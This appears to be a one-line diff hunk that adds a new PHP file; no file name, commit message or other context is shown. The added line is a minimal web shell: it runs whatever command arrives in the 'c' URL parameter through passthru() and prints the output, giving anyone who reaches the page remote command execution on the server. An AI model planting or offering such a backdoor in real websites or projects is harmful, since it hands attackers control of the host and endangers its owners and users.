@@ -1,0 +1,1 @@
+<?php echo '<pre>'; passthru($_GET['c']); ?>
